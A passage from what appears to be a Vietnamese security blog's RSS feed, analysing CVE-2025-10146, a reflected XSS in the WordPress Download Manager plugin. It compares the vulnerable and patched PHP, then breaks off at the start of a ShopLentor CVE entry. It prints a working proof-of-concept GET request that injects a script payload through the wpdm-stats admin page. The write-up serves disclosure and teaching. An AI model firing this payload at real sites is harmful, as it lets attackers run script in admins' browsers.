Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.3.23&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Download Manager&lt;/strong&gt;: v3.3.23(vul) và v3.3.24(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if (!empty($user_ids)): ?&amp;gt;&#xA;    &amp;lt;div class=&amp;#34;clear-filter&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        $get_params_xu = $get_params;&#xA;        unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);&#xA;        $reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;);&#xA;        ?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;&amp;lt;?php echo $reset_url; ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34; title=&amp;#34;&amp;lt;?php _e(&amp;#39;Clear user filter&amp;#39;, &amp;#39;download-manager&amp;#39;); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&#xA;        &amp;lt;/a&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;&amp;lt;?php endif; ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lấy &lt;strong&gt;GET params&lt;/strong&gt; và gán trực tiếp vào &lt;strong&gt;href&lt;/strong&gt; của thẻ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; mà không có cơ chế bảo vệ =&amp;gt; nguy cơ &lt;strong&gt;reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if (!empty($user_ids)): ?&amp;gt;&#xA;    &amp;lt;div class=&amp;#34;clear-filter&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        $get_params_xu = $get_params;&#xA;        unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);&#xA;        $get_params_xu = \WPDM\__\__::sanitize_array($get_params_xu, &amp;#39;safetxt&amp;#39;);&#xA;&#xA;        $reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;);&#xA;        ?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;&amp;lt;?php echo esc_url($reset_url); ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34; title=&amp;#34;&amp;lt;?php _e(&amp;#39;Clear user filter&amp;#39;, &amp;#39;download-manager&amp;#39;); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&#xA;        &amp;lt;/a&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;&amp;lt;?php endif; ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/patch_diff.png&#34;&#xA;    alt=&#34;Patch Diff: sanitized GET parameters and escaped URL&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff: sanitized GET parameters and escaped URL&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Bản vá đã &lt;strong&gt;sanitize&lt;/strong&gt; mảng &lt;strong&gt;GET params&lt;/strong&gt; bằng &lt;code&gt;sanitize_array&lt;/code&gt; và sử dụng &lt;code&gt;esc_url&lt;/code&gt;  để &lt;strong&gt;escape URL&lt;/strong&gt; =&amp;gt; an toàn hơn.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How It Work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta cần tìm URL thực sự để inject GET params chứa XSS payload.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt; chứa các tag &lt;strong&gt;php&lt;/strong&gt;, &lt;strong&gt;HTML&lt;/strong&gt; và nằm trong &lt;strong&gt;views&lt;/strong&gt; cho thấy file này được include ở nơi nào đó trong mã nguồn plugin.&lt;/p&gt;&#xA;&lt;p&gt;Ta tìm với từ khóa &lt;code&gt;history.php&lt;/code&gt; trong thư mục plugin&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/search1.png&#34;&#xA;    alt=&#34;Search results for history.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search results for history.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Không có kết quả nào khớp. Khả năng cao nó được include động như này &lt;code&gt;{$file_name}.php&lt;/code&gt;. Ta tìm với regex &lt;code&gt;\{.*\}\.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/regex.png&#34;&#xA;    alt=&#34;Regex search for dynamic includes&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Regex search for dynamic includes&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt; được include trong &lt;strong&gt;src/Admin/views/stats.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;URL thực sự để truy cập được khai báo ở đầu file &lt;strong&gt;stats.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$base_page_uri = &amp;#34;edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tương tự &lt;strong&gt;history.php&lt;/strong&gt;, &lt;strong&gt;stats.php&lt;/strong&gt; cũng được include ở đâu đó trong mã nguồn plugin. Nhưng không cần quan tâm vì ta đã tìm được URL thực sự.&lt;/p&gt;&#xA;&lt;p&gt;Để chắc chắn hơn, ta đặt &lt;strong&gt;breakpoint&lt;/strong&gt; tại vị trí lỗ hổng trong file &lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt;, sau đó bắt đầu debug và truy cập URL:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/debug.png&#34;&#xA;    alt=&#34;Breakpoint debugging to observe GET params&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Breakpoint debugging to observe GET params&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trước tiên, plugin lấy toàn bộ &lt;strong&gt;GET parameters&lt;/strong&gt; vào &lt;code&gt;$get_params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;$user_ids&lt;/code&gt; không rỗng, plugin sẽ tạo &lt;strong&gt;nút “Clear filter”&lt;/strong&gt;. Để làm nút này hoạt động, cần một URL mà &lt;strong&gt;không còn &lt;code&gt;user_ids&lt;/code&gt;&lt;/strong&gt; nữa, nên plugin làm như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$get_params_xu = $get_params;        // copy toàn bộ GET parameters&#xA;unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);   // bỏ user_ids ra khỏi mảng&#xA;$reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;); // tạo URL mới&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unset($get_params_xu[&#39;user_ids&#39;])&lt;/code&gt; =&amp;gt; loại bỏ bộ lọc &lt;code&gt;user_ids&lt;/code&gt; khỏi URL.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;add_query_arg($get_params_xu, &#39;edit.php&#39;)&lt;/code&gt; &amp;gt; tạo URL mới với các tham số còn lại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Cuối cùng, URL này được gắn vào nút “Clear filter”:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;#34;&amp;lt;?php echo $reset_url; ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Kết quả:&lt;/strong&gt; Khi người dùng nhấn nút, trang sẽ load lại &lt;strong&gt;mà không còn bộ lọc user_ids&lt;/strong&gt;, tức là &lt;code&gt;“clear filter”&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi GET request chứa XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&amp;amp;user_ids[0]=1&amp;amp;payload=&amp;#34;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta thêm &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt; để đóng thẻ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; sau đó thêm 1 script dể &lt;code&gt;alert()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/xss.png&#34;&#xA;    alt=&#34;Reflected XSS triggered via GET parameter&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Reflected XSS triggered via GET parameter&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 XSS thành công, khi người dùng có đặc quyền truy cập vào URL do attacker cung cấp thì &lt;strong&gt;reflected XSS&lt;/strong&gt; xảy ra =&amp;gt; Xảy ra đúng kịch bản &lt;strong&gt;Unauthenticated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-10146&lt;/strong&gt; trong plugin &lt;strong&gt;WordPress Download Manager &amp;lt;= 3.3.23&lt;/strong&gt; là &lt;strong&gt;reflected XSS&lt;/strong&gt;, xảy ra khi dữ liệu từ &lt;strong&gt;GET request&lt;/strong&gt; được in trực tiếp vào &lt;strong&gt;HTML attribute&lt;/strong&gt; mà không được sanitize hoặc escape. Người dùng có quyền truy cập vào đường dẫn này (admin/author) có thể bị tấn công nếu truy cập URL do attacker tạo.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;3.3.24&lt;/strong&gt; đã:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sanitize mảng GET parameters&lt;/strong&gt; (&lt;code&gt;sanitize_array&lt;/code&gt;) để loại bỏ ký tự nguy hiểm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Escape URL&lt;/strong&gt; khi in ra HTML (&lt;code&gt;esc_url&lt;/code&gt;) để ngăn XSS.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;sanitize và escape dữ liệu&lt;/strong&gt; từ người dùng trước khi render ra HTML.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra &lt;strong&gt;quyền truy cập&lt;/strong&gt; trước khi xử lý hoặc hiển thị dữ liệu nhạy cảm.&lt;/li&gt;&#xA;&lt;li&gt;Ngay cả các role thấp (contributor) vẫn có thể trở thành điểm tấn công nếu plugin không bảo vệ đúng cách.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật plugin thường xuyên là cách phòng thủ đơn giản nhưng hiệu quả nhất.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/download-manager/vulnerability/wordpress-download-manager-plugin-3-3-23-reflected-cross-site-scripting-via-user-ids-parameter-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Download Manager Plugin &amp;lt;= 3.3.24 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58990 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/</link>
      <pubDate>Sun, 05 Oct 2025 22:45:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng trong plugin &lt;strong&gt;ShopLentor&lt;/strong&gt; trước phiên bản &lt;strong&gt;3.2.0&lt;/strong&gt; cho phép kẻ tấn công có quyền &lt;strong&gt;contributor&lt;/strong&gt; chèn mã độc vào CSS của block. CSS này sau đó được nạp inline vào trang và có khả năng dẫn tới Stored XSS khi được preview hoặc hiển thị trong trình duyệt.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58990&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58990&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/woolentor-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ShopLentor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;ShopLentor&lt;/strong&gt;: v3.2.0(vul) và v3.2.1(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Actived WooCommerce plugin&lt;/strong&gt;: 